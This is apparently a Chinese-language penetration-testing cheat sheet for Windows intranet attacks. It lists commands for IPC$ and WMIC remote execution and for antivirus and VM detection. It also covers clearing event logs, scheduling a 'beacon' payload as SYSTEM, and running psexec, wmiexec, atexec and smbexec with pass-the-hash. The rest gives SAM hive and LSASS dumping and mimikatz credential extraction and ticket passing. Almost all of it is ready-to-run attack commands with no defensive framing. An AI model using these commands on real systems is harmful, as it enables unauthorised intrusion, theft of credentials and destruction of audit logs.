### IPC命令

#### 建立IPC连接

```
net use \\IP\ipc$ "password" /user:username
```

#### 查看当前网络资源连接

```
net use
```

#### 查看文件内容

```
type \\IP\c$\xx.txt
```

#### 查看远程主机目录

```
dir \\IP\c$
```

#### 查看远程主机进程

```
tasklist \\IP\c$
```

#### 拷贝文件

```
copy 本地路径 \\IP\文件名  #拷贝本地文件到远程主机
copy \\IP\文件名 文件名    #拷贝远程主机文件到本机
```

#### 删除文件

```
del 文件名 \\IP\文件名
```

#### 获取机器时间

```
net time \\IP
```

#### 删除IPC连接

```
net use \\IP /del
```

### WMIC命令

#### 获取系统角色、用户名和制造商

```
wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles/format:list
```

#### 获取SID

```
wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status
```

#### 创建进程

```
wmic process call create "[Process Name]"
wmic process call create "taskmgr.exe"
```

#### 终结进程

```
wmic process where name=”explorer.exe” call terminate
```

#### 获取可执行文件列表

```
wmic process where "NOT ExecutablePath LIKE '%Windows%'" GET ExecutablePath
```

#### 获取目录属性

```
wmic fsdir where="drive='c:' and filename='test'" get /format:list'
```

#### 获取文件属性

```
wmic datafile where='[Path of File]' get /format:listwmic datafile where name='c:\\windows\\system32\\demo\\demo.txt' get /format:list
```

#### 定位系统文件

```
wmic environment get Description, VariableValue
```

#### 获取已安装的应用程序列表

```
wmic product get name
```

#### 获取正在运行的服务列表

```
wmic service where (state="running") get caption, name, startmode
```

#### 获取系统驱动详情

```
wmic sysdriver get Caption, Name, PathName, ServiceType, State, Status /format:list
```

#### 获取操作系统详情

```
wmic os get CurrentTimeZone, FreePhysicalMemory, FreeVirtualMemory, LastBootUpdate,NumberofProcesses, NumberofUsers, Organization, RegisteredUsers, Status/format:list
```

#### 获取主板信息和BIOS序列号

```
wmic baseboard, get Manufacturer, Product, SerialNumber, Version
```

```
wmic bios, get serialNumber
```

#### 获取内存缓存数据

```
wmic memcache get Name, BlockSize, Purpose, MaxCacheSize, Status
```

#### 获取内存芯片信息

```
wmic memorychip get PartNumber, SerialNumber
```

#### 判断目标系统是否为虚拟机

```
wmic onboarddevice get Desciption, DeviceType, Enabled, Status /format:list
```

#### 获取反病毒产品详情

```
wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
```

#### 清理系统日志

```
wmic nteventlog where filename='[logfilename]' cleareventlogwmic nteventlog where filename='system' cleareventlog
```

#### 远程执行命令

```
wmic /node:<IP> /user:username /password:password process call create "cmd.exe /c whoami > c:\windows\temp\1.txt"

wmic /node:<IP> process call create "cmd.exe /c whoami > c:\windows\temp\1.txt"

查看执行结果
type \\ip\c$\windows\temp\1.txt
```

### 计划任务

#### at命令

```
at \\IP 15:22:40 C:\calc.bat  #创建计划任务
at \\IP /delete               #删除计划任务
```

#### schtasks命令
```
schtasks /create /s IP /ru "SYSTEM" /tn beacon /sc DAILY /tr c:\4444.exe /F # 创建beacon任务对应执行文件，每天运行一次
schtasks /run /s IP /tn beacon /i # 运行beacon服务
schtasks /delete /s IP /tn "beacon" /f  #删除计划任务
```


### 横向移动工具

#### atexec
	atexec是通过windows计划任务执行远程命令，atexec是一个半交互的工具，即参数中添加需要在远程主机执行的命令，工具执行后即返回命令结果，适用于webshell下，也适用于其他网络环境。

```
atexec ./user:password@IP "命令"
atexec -hashes :hash ./user@IP "命令"
```

#### wmiexec
	wmiexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。

```
wmiexec ./user:password@IP "命令"
wmiexec -hashes :hash ./user@IP "命令"
```

#### psexec
	psexec是一个即有全交互也有半交互的远程命令执行工具，可运用于多种环境，包括webshell环境、rdp环境、socks环境等。

```
psexec ./user:password@IP "命令"
psexec -hashes :hash ./user@IP "命令"
```

#### smbexec
	smbexe为全交互式工具，所以不可用于webshell环境，可用于rdp等有交互环境登录使用或socks代理环境下使用。

```
smbexec ./user:password@IP
smbexec -hashes :hash ./user@IP
```

### 抓取密码和Hash

#### 单机抓取密码

```
GetPass.exe
PwDump7.exe
```

#### SAM和SYSTEM抓取密码

```
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```

```
使用mimikatz读取SAM和SYSTEM文件获得HASH

mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" "exit"
```

#### mimikatz

##### mimikatz 命令详解

```
privilege::debug      #提升权限
token::elevate        #将权限提升至system
lsadump::sam          #读取本地SAM文件，获得HASH
sekurlsa::logonpasswords  #在线读取散列值及明文密码
```

##### mimikatz 离线读取lsass.dmp

###### 使用Procdump 导出lsass.dmp

```
Procdump.exe -accepteula -ma -lsass.exe lsass.dmp
```

###### mimikatz 读取lsass.dmp

```
mimikatz
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```

##### mimikatz 抓取AES-256密钥

```
mimikatz "privilege::debug" "sekurlsa::ekeys"
```

#### Hash传递

##### mimikatz 传递NTLM Hash

```
mimikatz "privilege::debug" "sekurlsa::pth /user:user /domain:domain /ntlm:hash"
```

##### mimikatz 传递AES-256

```
mimikatz "privilege::debug" "sekurlsa::pth /user:user /domain:domain /ase256:hash"
```

##### mimikatz 票据传递

###### 将内存中的票据导出

```
mimikatz "privilege::debug" "sekurlsa::tickets /export"
```

###### 清除内存中的票据

```
mimikatz "kerberos::purge"
```

###### 将票据注入内存

```
mimikatz "kerberos::ptt "path""
```

##### kebeo 票据传递

###### 生成票据文件

```
kebeo "tgt::ask /user:user /domain:domain /ntlm:hash"
```

###### 清除内存中的其他票据

```
kerberos::purge

klist purge
```

###### 将票据文件导入内存

```
Kerberos::ptt PATH
```

